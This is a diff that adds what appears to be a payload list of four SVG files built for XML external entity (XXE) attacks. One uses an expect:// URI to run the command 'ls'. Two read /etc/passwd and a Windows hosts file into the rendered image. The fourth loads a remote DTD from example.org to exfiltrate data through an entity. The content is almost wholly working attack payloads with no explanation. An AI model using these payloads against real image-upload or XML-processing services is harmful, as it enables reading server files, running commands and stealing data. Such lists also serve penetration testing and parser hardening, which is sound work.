@@ -1,0 +1,39 @@
+1-<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
+    <image xlink:href="expect://ls" width="200" height="200"></image>
+</svg>
+
+
+2-<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
+<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
+   <text font-size="16" x="0" y="16">&xxe;</text>
+</svg>
+
+
+3-<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts.ics" > ]>
+<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
+   <text font-size="16" x="0" y="16">&xxe;</text>
+</svg>
+
+
+
+4-<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE svg [
+<!ELEMENT svg ANY >
+<!ENTITY % sp SYSTEM "http://example.org:8080/xxe.xml">
+%sp;
+%param1;
+]>
+<svg viewBox="0 0 200 200" version="1.2" xmlns="http://www.w3.org/2000/svg" style="fill:red">
+      <text x="15" y="100" style="fill:black">XXE via SVG rasterization</text>
+      <rect x="0" y="0" rx="10" ry="10" width="200" height="200" style="fill:pink;opacity:0.7"/>
+      <flowRoot font-size="15">
+         <flowRegion>
+           <rect x="0" y="0" width="200" height="200" style="fill:red;opacity:0.3"/>
+         </flowRegion>
+         <flowDiv>
+            <flowPara>&exfil;</flowPara>
+         </flowDiv>
+      </flowRoot>
+</svg>
